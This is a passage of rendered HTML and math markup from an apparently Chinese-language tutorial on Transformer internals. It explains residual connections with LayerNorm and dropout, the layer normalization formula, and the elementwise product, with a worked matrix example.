cjk_fallback\">在应用函数</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">之后</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">对结果应用</span><span class=\"mord\">Dropout,</span><span class=\"mord cjk_fallback\">以防止过拟合</span><span class=\"mord\">:</span></span></span></span><span style=\"top:4.884165000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathrm\">D</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">p</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">u</span><span class=\"mord mathrm\">t</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span><span style=\"top:6.384165000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">Dropout</span><span class=\"mord cjk_fallback\">的具体操作是在每次训练</span></span></span></span><span style=\"top:9.384165000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:10.884165000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.801892em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">D</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">p</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">u</span><span class=\"mord mathrm\">t</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:14.544165000000001em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:-11.544165000000001em;\"><span style=\"top:9.384165000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord text\"><span class=\"mord cjk_fallback\">最后</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">将</span><span class=\"mord\">Dropout</span><span class=\"mord cjk_fallback\">的结果与原输入</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">x</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">相加</span><span class=\"mord\">,</span><span class=\"mord cjk_fallback\">实现残差连接</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:13.044165000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中 g (x) 表示自注意层或前馈网络。对于每层的 g，我们输入 g 之前都要对 x 进行层归一化，对 g 的输出应用 dropout，并将输入 x 添加到最终输出中。</p>\n</li>\n</ul>\n<h3 id=\"层归一化\"><a class=\"anchor\" href=\"#层归一化\">#</a> 层归一化</h3>\n<p>用于加速和稳定神经网络的训练过程。它通过在每一层对输入进行归一化，解决了在深层神经网络中训练时可能遇到的一些问题，例如梯度消失和梯度爆炸。</p>\n<p>层归一化的基本思想是对每个神经元的输入进行归一化，使得输入的均值为 0，方差为 1。与批量归一化（Batch Normalization）不同，层归一化在计算归一化统计量时，只考虑当前层的输入，而不是一个小批量的数据。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi mathvariant=\"bold\">x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>α</mi><mo>⊙</mo><mfrac><mrow><mi mathvariant=\"bold\">x</mi><mo>−</mo><mi>μ</mi></mrow><msqrt><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>+</mo><mi>ϵ</mi></mrow></msqrt></mfrac><mo>+</mo><mi>β</mi><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">\\mathrm{LayerNorm}(\\mathbf{x})=\\alpha\\odot\\frac{\\mathbf{x}-\\mu}{\\sqrt{\\sigma^{2}+\\epsilon}}+\\beta,\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathbf\">x</span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.0037em;\">α</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.1903300000000003em;vertical-align:-0.93em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2603300000000002em;\"><span style=\"top:-2.196611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.913389em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">ϵ</span></span></span><span style=\"top:-2.873389em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.12661100000000003em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">x</span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">μ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span><span class=\"mpunct\">,</span></span></span></span></span></p>\n<p>其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>⊙</mo></mrow><annotation encoding=\"application/x-tex\">\\odot</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord\">⊙</span></span></span></span> 是元素向乘积，是指对两个相同维度的矩阵或向量进行对应元素的逐个相乘。这个操作不同于矩阵乘法，它不涉及矩阵之间的行列相乘和求和，只是简单地对对应位置的元素进行乘积运算。</p>\n<h4 id=\"元素向量积的数学表示\"><a class=\"anchor\" href=\"#元素向量积的数学表示\">#</a> 元素向量积的数学表示</h4>\n<p>假设有两个相同维度矩阵 A 和 B，元素分别为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>A</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">A_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>B</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding=\"application/x-tex\">B_{ij}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span>，则它们的元素向量积 C 可以表示为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>C</mi><mo>=</mo><mi>A</mi><mo>⊙</mo><mi>B</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>其中,</mtext><msub><mi>C</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>=</mo><msub><mi>A</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mo>×</mo><msub><mi>B</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub><mtext>。</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}&amp;C=A\\odot B\\\\\\\\&amp;\\text{其中,}C_{ij}=A_{ij}\\times B_{ij}。\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.500000000000002em;vertical-align:-2.000000000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.5000000000000004em;\"><span style=\"top:-4.5em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:2.84em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.000000000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.5000000000000004em;\"><span style=\"top:-4.66em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">A</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span></span></span><span style=\"top:-1.6599999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">其中</span><span class=\"mord\">,</span></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">。</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.0000000000000004em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<h5 id=\"举个例子\"><a class=\"anchor\" href=\"#举个例子\">#</a> 举个例子</h5>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>假设有两个矩阵</mtext><mi>A</mi><mtext>和</mtext><mi>B</mi><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>A</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>6</mn></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>B</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>8</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>9</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>10</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>11</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>12</mn></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>它们的元素向乘积 C 为:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>C</mi><mo>=</mo><mi>A</mi><mo>⊙</mo><mi>B</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>1</mn><mo>×</mo><mn>7</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>2</mn><mo>×</mo><mn>8</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>3</mn><mo>×</mo><mn>9</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>4</mn><mo>×</mo><mn>10</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>5</mn><mo>×</mo><mn>11</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow><mn>6</mn><mo>×</mo><mn>12</mn></mrow></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>7</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>16</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>27</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>40</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>55</mn></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mn>72</mn></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;假设有两个矩阵A和B: \\\\\n&amp;A=\\begin{pmatrix}1&amp;2&amp;3\\\\4&amp;5&amp;6\\end{pmatrix} \\\\\n&amp;B=\\begin{pmatrix}7&amp;8&amp;9\\\\10&amp;11&amp;12\\end{pmatrix} \\\\\n&amp;\\text{它们的元素向乘积 C 为:} \\\\\n&amp;C=A\\odot B=\\begin{pmatrix}1\\times7&amp;2\\times8&amp;3\\times9\\\\4\\times10&amp;5\\times11&amp;6\\times12\\end{pmatrix}=\\begin{pmatrix}7&amp;16&amp;27\\\\40&amp;55&amp;72\\end{pmatrix}\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:11.100090000000002em;vertical-align:-5.300045000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.800045em;\"><span style=\"top:-8.410045em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"></span></span><span style=\"top:-6.300044999999999em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.6000149999999995em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.5099849999999995em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.6000150000000004em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.300045000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.800045em;\"><span style=\"top:-8.410045em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">假</span><span class=\"mord cjk_fallback\">设</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">两</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">矩</span><span class=\"mord cjk_fallback\">阵</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:-6.300044999999999em;\"><span class=\"pstrut\" style=\"height:3.45em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\"><span class=\"delimsizing size3\">(</span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">1</span></span></span><span style=\"top:-2.4099999999999997em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\">4</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9500000000000004em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.45em;\"><span style=\"top:-3.61em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span 